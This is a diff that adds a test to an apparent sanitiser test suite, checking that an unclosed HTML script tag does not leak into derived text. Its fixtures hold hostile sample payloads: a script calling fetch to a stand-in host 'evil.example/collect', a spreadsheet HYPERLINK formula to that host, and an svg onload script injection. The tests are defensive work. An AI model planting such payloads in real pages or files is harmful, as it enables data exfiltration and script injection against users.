@@ -40,6 +40,18 @@ describe("source-preserving Artifact transformations", () => {
     expect(hostile.warnings).toContain("Active HTML content was stripped; extracted text is inert and was never executed.");
   });
 
+  it("does not leak the body of an unclosed active HTML container into derived text", async () => {
+    const hostile = await inspectArtifact(new Blob([
+      "<h1>Visible receipt</h1><script>fetch('https://evil.example/collect'); document.body.innerHTML = '<p>clobbered</p>'"
+    ]), "unclosed-script.html", "text/html");
+
+    expect(hostile.metadata).toMatchObject({ activeContentStripped: true });
+    expect(hostile.derivedText?.text).toBe("Visible receipt");
+    expect(hostile.derivedText?.text).not.toContain("fetch");
+    expect(hostile.derivedText?.text).not.toContain("evil.example");
+    expect(hostile.derivedText?.text).not.toContain("document.body");
+  });
+
   it("keeps hostile spreadsheet formulas, markup, links, and macros inert while preserving the source", async () => {
     const csv = await inspectArtifact(new Blob([
       "merchant,amount,note\n=HYPERLINK(\"https://evil.example\"),=1+1,<svg onload=alert(1)>"
